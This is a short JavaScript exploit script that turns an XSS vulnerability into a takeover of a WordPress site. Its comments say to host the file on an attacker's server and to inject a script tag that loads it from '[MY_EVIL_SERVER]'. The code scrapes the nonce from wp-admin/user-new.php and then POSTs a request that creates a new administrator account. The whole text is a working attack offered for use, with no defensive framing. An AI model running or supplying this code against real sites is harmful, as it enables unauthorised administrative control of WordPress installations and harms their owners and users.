//Use this to exploit XSS to compromise the application.  
// just use the XSS payload of <script src=http://[MY_EVIL_SERVER]/add_admin.js>
//Host this file on your server 
url = "http://[TARGET]/wp-admin/user-new.php";
var login = "";
var pass = "";
var email =  "";

function httpGet(url)
{
		    var xmlHttp = new XMLHttpRequest();
		    xmlHttp.open( "GET", url, false ); // false for synchronous request
		    xmlHttp.send( null );
		    return xmlHttp.responseText;
}
var all = httpGet(url);
var nonce = all.split("name=\"_wpnonce_create-user\" value=\""); 
var nonce = nonce[1].slice(0, 10); 
var http = new XMLHttpRequest();
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" + login + "&email=" + email + "&first_name=&last_name=&url=&pass1=" + pass + "&pass1-text=" + pass + "&pass2=" + pass + "&pw_weak=on&role=administrator&createuser=Add+New+User";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.send(params);
